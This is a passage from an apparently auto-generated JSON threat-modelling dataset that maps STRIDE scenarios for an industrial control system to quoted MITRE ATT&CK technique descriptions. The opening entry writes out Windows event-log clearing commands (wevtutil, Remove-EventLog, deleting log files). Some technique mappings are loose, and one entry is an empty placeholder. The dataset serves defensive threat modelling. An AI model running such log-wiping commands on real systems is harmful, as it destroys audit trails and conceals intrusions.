                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data between the gateway and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Data encryption in transit is not enforced",
                    "Role": "System Architect",
                    "Condition": "Weak or no encryption"
                },
                {
                    "Assumption": "The attacker can eavesdrop on data transmissions",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "Sensitive data is transmitted without obfuscation or protection",
                    "Role": "System Engineer",
                    "Condition": "Lack of data protection mechanisms"
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data leading to potential exploitation.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted data",
                "network eavesdropping",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious insider accesses sensitive data stored in the MES database without authorization.",
            "Assumptions": [
                {
                    "Assumption": "The insider has privileged access to the MES database",
                    "Role": "Insider",
                    "Condition": "Assigning of high-level access rights"
                },
                {
                    "Assumption": "Access controls are insufficient to restrict database access",
                    "Role": "System Architect",
                    "Condition": "Weak access control policies"
                },
                {
                    "Assumption": "No data access audits are performed regularly",
                    "Role": "Security Analyst",
                    "Condition": "Lack of access audits"
                }
            ],
            "Potential Impact": "Unauthorized data access leading to potential misuse or leakage of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database access",
                "insider threat",
                "MES"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exfiltrates data from field devices by exploiting a vulnerability in the communication protocol.",
            "Assumptions": [
                {
                    "Assumption": "Field devices communicate using a vulnerable protocol",
                    "Role": "Device Manufacturer",
                    "Condition": "Use of outdated or insecure protocol"
                },
                {
                    "Assumption": "The attacker knows how to exploit this protocol vulnerability",
                    "Role": "Attacker",
                    "Condition": "Expertise in protocol exploitation"
                },
                {
                    "Assumption": "Network defenses do not detect or block such exfiltration attempts",
                    "Role": "Network Engineer",
                    "Condition": "Lack of network defenses"
                }
            ],
            "Potential Impact": "Loss of operational data leading to potential replicate attack strategies.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "protocol vulnerability",
                "data exfiltration",
                "field devices"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a Distributed Denial of Service (DDoS) attack on the Control Center\u2019s WAN link.",
            "Assumptions": [
                {
                    "Assumption": "The WAN link has limited bandwidth capacity",
                    "Role": "Network Engineer",
                    "Condition": "Capacity constraints"
                },
                {
                    "Assumption": "The attacker can control a large botnet to flood the network",
                    "Role": "Attacker",
                    "Condition": "Possession of botnet resources"
                },
                {
                    "Assumption": "No effective DDoS mitigation strategy is in place",
                    "Role": "System Administrator",
                    "Condition": "Lack of mitigation controls"
                }
            ],
            "Potential Impact": "Disruption of command and control communications, impacting operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS attack",
                "WAN link",
                "control center"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker causes a field device to enter a failure state by exploiting its firmware.",
            "Assumptions": [
                {
                    "Assumption": "The field device operates with a known firmware vulnerability",
                    "Role": "Device Manufacturer",
                    "Condition": "Unpatched firmware"
                },
                {
                    "Assumption": "The attacker has knowledge of and access to exploit this vulnerability",
                    "Role": "Attacker",
                    "Condition": "Exploit knowledge"
                },
                {
                    "Assumption": "There are no failover mechanisms to compensate for device failure",
                    "Role": "System Engineer",
                    "Condition": "Lack of device redundancy"
                }
            ],
            "Potential Impact": "Device unavailability leading to potential process downtime.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "firmware exploit",
                "field device",
                "device failure"
            ],
            "mitre_technique": {
                "name": "Module Firmware",
                "description": "Adversaries may install malicious or vulnerable firmware onto modular hardware devices. Control system devices often contain modular hardware devices. These devices may have their own set of firmware that is separate from the firmware of the main control system equipment.   \n\nThis technique is similar to [System Firmware](https://attack.mitre.org/techniques/T0857), but is conducted on other system components that may not have the same capabilities or level of integrity checking. Although it results in a device re-image, malicious device firmware may provide persistent access to remaining devices. (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\nAn easy point of access for an adversary is the Ethernet card, which may have its own CPU, RAM, and operating system. The adversary may attack and likely exploit the computer on an Ethernet card. Exploitation of the Ethernet card computer may enable the adversary to accomplish additional attacks, such as the following: (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\n* Delayed Attack - The adversary may stage an attack in advance and choose when to launch it, such as at a particularly damaging time.  \n* Brick the Ethernet Card - Malicious firmware may be programmed to result in an Ethernet card failure, requiring a factory return.  \n* Random Attack or Failure - The adversary may load malicious firmware onto multiple field devices. Execution of an attack and the time it occurs is generated by a pseudo-random number generator.   \n* A Field Device Worm - The adversary may choose to identify all field devices of the same model, with the end goal of performing a device-wide compromise.  \n* Attack Other Cards on the Field Device - Although it is not the most important module in a field device, the Ethernet card is most accessible to the adversary and malware. Compromise of the Ethernet card may provide a more direct route to compromising other modules, such as the CPU module.",
                "id": "attack-pattern--efbf7888-f61b-4572-9c80-7e2965c60707",
                "technique_id": "T0839"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious insider sends malformed requests to the cloud services, causing them to crash.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not adequately validate input data",
                    "Role": "Cloud Service Provider",
                    "Condition": "Lack of input validation"
                },
                {
                    "Assumption": "The insider has sufficient privileges to send service requests",
                    "Role": "Insider",
                    "Condition": "Authorization to send requests"
                },
                {
                    "Assumption": "There is no rate limiting or anomaly detection on request patterns",
                    "Role": "Cloud Service Provider",
                    "Condition": "No rate limiting or anomaly detection"
                }
            ],
            "Potential Impact": "Cloud services disruption affecting data availability and processing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud services",
                "input validation",
                "service crash"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the MES application to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The MES application contains an unpatched vulnerability",
                    "Role": "System Architect",
                    "Condition": "Known or unknown vulnerability"
                },
                {
                    "Assumption": "The attacker has the knowledge and tools to exploit the vulnerability",
                    "Role": "Attacker",
                    "Condition": "Exploitation capability"
                },
                {
                    "Assumption": "No privilege-separation mechanisms are in place to limit impact",
                    "Role": "System Engineer",
                    "Condition": "Lack of privilege separation"
                }
            ],
            "Potential Impact": "Unauthorized administrative access leading to potential system control takeover.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "administrative privileges",
                "MES"
            ],
            "mitre_technique": {
                "name": "Elevated Execution with Prompt",
                "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
                "id": "attack-pattern--101c3a64-9ba5-46c9-b573-5c501053cbca",
                "technique_id": "T1514"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider uses valid credentials to escalate privileges within the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The insider's credentials are not restricted in scope",
                    "Role": "System Administrator",
                    "Condition": "Over-privileged credentials"
                },
                {
                    "Assumption": "Cloud services do not have monitoring for suspicious privilege escalation",
                    "Role": "Cloud Service Provider",
                    "Condition": "Lack of monitoring"
                },
                {
                    "Assumption": "Role-based access controls (RBAC) are poorly implemented",
                    "Role": "System Architect",
                    "Condition": "Weak RBAC policies"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data or critical functions in the cloud.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "cloud services",
                "RBAC"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker intercepts and replays control commands to gain unauthorized access to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels do not use nonces or session tokens",
                    "Role": "System Architect",
                    "Condition": "Lack of session control mechanisms"
                },
                {
                    "Assumption": "The attacker has the capability to intercept and alter command traffic",
                    "Role": "Attacker",
                    "Condition": "Network interception capability"
                },
                {
                    "Assumption": "Commands are not authenticated or verified by RTUs",
                    "Role": "System Engineer",
                    "Condition": "Lack of command authentication"
                }
            ],
            "Potential Impact": "Unauthorized command execution leading to potential control over field devices.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "replay attack",
                "command interception",
                "RTUs"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "16",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a control center operator accessing the HMI.",
            "Assumptions": [
                {
                    "Assumption": "The attacker knows valid operator credentials.",
                    "Role": "Attacker",
                    "Condition": "Operator credentials are not secure or have been compromised."
                },
                {
                    "Assumption": "The system lacks multi-factor authentication (MFA).",
                    "Role": "System Designer",
                    "Condition": "MFA is not implemented in the system for operator access."
                },
                {
                    "Assumption": "The attacker has network access to the control center.",
                    "Role": "Attacker",
                    "Condition": "Network security controls are insufficient or have been bypassed."
                }
            ],
            "Potential Impact": "Unauthorized access to control commands leading to potential operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "authentication",
                "identity spoofing",
                "HMI access"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker forges the identity of an RTU to send false data to the SCADA system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can mimic RTU communication protocols.",
                    "Role": "Attacker",
                    "Condition": "Communication protocols are known and can be replicated."
                },
                {
                    "Assumption": "Endpoint verification mechanisms are weak or not in place.",
                    "Role": "System Designer",
                    "Condition": "Insufficient security checks for RTU identity verification."
                },
                {
                    "Assumption": "The attacker can inject packets into the network.",
                    "Role": "Attacker",
                    "Condition": "Network access allows packet injection capabilities."
                }
            ],
            "Potential Impact": "False data could lead to incorrect control decisions and potentially hazardous operations.",
            "MITRE ATT&CK Keywords": [
                "network",
                "RTU communication",
                "false data injection",
                "protocol spoofing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker falsely represents a field device to the gateway to intercept data.",
            "Assumptions": [
                {
                    "Assumption": "Device identities are not strongly authenticated.",
                    "Role": "System Designer",
                    "Condition": "Weak or non-existent device authentication mechanisms."
                },
                {
                    "Assumption": "The attacker can physically or logically access the device network.",
                    "Role": "Attacker",
                    "Condition": "Inadequate physical or network segregation controls."
                },
                {
                    "Assumption": "The system relies on unencrypted communication protocols.",
                    "Role": "System Designer",
                    "Condition": "Communication between devices and gateway lacks encryption."
                }
            ],
            "Potential Impact": "Data interception could compromise sensitive operational information.",
            "MITRE ATT&CK Keywords": [
                "network interception",
                "device identity spoofing",
                "data exfiltration",
                "communication security"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies control commands in transit between the Control Center and RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access to intercept and alter messages.",
                    "Role": "Attacker",
                    "Condition": "Network encryption and integrity checks are inadequate."
                },
                {
                    "Assumption": "Commands are not cryptographically signed.",
                    "Role": "System Designer",
                    "Condition": "System lacks digital signature implementation for commands."
                },
                {
                    "Assumption": "The attacker understands communication protocols.",
                    "Role": "Attacker",
                    "Condition": "Documentation or reverse engineering reveals protocol details."
                }
            ],
            "Potential Impact": "Altered control commands can lead to incorrect or dangerous operational behavior.",
            "MITRE ATT&CK Keywords": [
                "data modification",
                "command tampering",
                "network access",
                "integrity violation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries with privileged network access may seek to modify network traffic in real time using adversary-in-the-middle (AiTM) attacks. (Citation: Gabriel Sanchez October 2017) This type of attack allows the adversary to intercept traffic to and/or from a particular device on the network. If a AiTM attack is established, then the adversary has the ability to block, log, modify, or inject traffic into the communication stream. There are several ways to accomplish this attack, but some of the most-common are Address Resolution Protocol (ARP) poisoning and the use of a proxy. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)  \n\nAn AiTM attack may allow an adversary to perform the following attacks:  \n[Block Reporting Message](https://attack.mitre.org/techniques/T0804), [Spoof Reporting Message](https://attack.mitre.org/techniques/T0856), [Modify Parameter](https://attack.mitre.org/techniques/T0836), [Unauthorized Command Message](https://attack.mitre.org/techniques/T0855)",
                "id": "attack-pattern--9a505987-ab05-4f46-a9a6-6441442eec3b",
                "technique_id": "T0830"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker changes configuration settings on PLCs controlling critical processes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or network access to PLCs.",
                    "Role": "Attacker",
                    "Condition": "PLCs lack sufficient access control mechanisms."
                },
                {
                    "Assumption": "Configuration changes are not logged or monitored.",
                    "Role": "System Designer",
                    "Condition": "Insufficient logging and monitoring of configuration changes."
                },
                {
                    "Assumption": "PLCs do not use secure update mechanisms.",
                    "Role": "System Designer",
                    "Condition": "PLCs allow insecure or unauthenticated configuration updates."
                }
            ],
            "Potential Impact": "Changes in configuration can disrupt manufacturing processes or damage equipment.",
            "MITRE ATT&CK Keywords": [
                "configuration tampering",
                "PLC access",
                "control logic modification",
                "process disruption"
            ],
            "mitre_technique": {
                "name": "Loss of Protection",
                "description": "Adversaries may compromise protective system functions designed to prevent the effects of faults and abnormal conditions. This can result in equipment damage, prolonged process disruptions and hazards to personnel. \n\nMany faults and abnormal conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage. \n\nAdversaries may target and disable protective system functions as a prerequisite to subsequent attack execution or to allow for future faults and abnormal conditions to go unchecked. Detection of a Loss of Protection by operators can result in the shutdown of a process due to strict policies regarding protection systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.",
                "id": "attack-pattern--2bb4d762-bf4a-4bc3-9318-15cc6a354163",
                "technique_id": "T0837"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data stored in the MES database to disrupt production workflows.",
            "Assumptions": [
                {
                    "Assumption": "Database access controls are weak.",
                    "Role": "System Designer",
                    "Condition": "Access controls for the MES database are misconfigured or insufficient."
                },
                {
                    "Assumption": "Data integrity checks are not implemented.",
                    "Role": "System Designer",
                    "Condition": "Lack of mechanisms to ensure data integrity within the database."
                },
                {
                    "Assumption": "Database interactions are not properly logged and audited.",
                    "Role": "System Designer",
                    "Condition": "Absence of comprehensive logging and alerting on database operations."
                }
            ],
            "Potential Impact": "Altered data can lead to incorrect production workflows, causing delays and production issues.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "workflow disruption",
                "data integrity",
                "production interference"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An operator denies sending a critical command after an unexpected system shutdown.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks proper logging of actions.",
                    "Role": "System Designer",
                    "Condition": "System doesn't keep comprehensive logs of user actions."
                },
                {
                    "Assumption": "Commands are not digitally signed.",
                    "Role": "System Designer",
                    "Condition": "No digital signature mechanisms for verifying command origin."
                },
                {
                    "Assumption": "Access to the logs is not restricted or monitored.",
                    "Role": "System Designer",
                    "Condition": "Logs can be edited or deleted without detection."
                }
            ],
            "Potential Impact": "It becomes difficult to trace the cause of the shutdown and who is responsible.",
            "MITRE ATT&CK Keywords": [
                "action repudiation",
                "logging",
                "audit trail",
                "command verification"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
